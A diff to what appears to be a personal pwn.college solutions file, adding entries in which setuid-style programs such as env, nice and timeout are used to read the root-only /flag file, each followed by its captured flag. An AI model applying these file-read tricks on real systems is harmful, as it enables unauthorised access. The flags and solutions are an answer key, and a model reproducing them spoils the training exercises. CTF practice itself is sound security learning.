@@ -95,7 +95,9 @@ pwn.college{A7I5HGI7_suJAVVule_cvW-B_zN.0lM2EDLwIzW}
 /bin/ar p /flag.a
 pwn.college{0VOQzQpy9LX-ycBn2AI0mXrM7Wg.01M2EDLwIzW}
 
-## Level22
+## Level24
+/bin/env -i cat /flag
+pwn.college{0uj9Z12xXk2h4Q1B2rJedYDXxBx.0lN2EDLwIzW}
 
 ## Level25
 find /flag -exec cat \{\} \;
@@ -112,6 +114,14 @@ all:
 ```
 make
 pwn.college{gCE3UO5i2nNP-u0o2K6emjDklBS.0FO2EDLwIzW}
+
+## Level27
+/bin/nice --adjustment=10 cat /flag
+pwn.college{wtWboGxA4-Q1gkXKUgDWfQ_uJZ8.0VO2EDLwIzW}
+
+## Level28
+/bin/timeout 15 cat /flag
+pwn.college{YDxxfEntmoGdxwiKMDL1SGgZV5T.0FM3EDLwIzW}
 
 ## Level29
 /bin/stdbuf -oL cat /flag
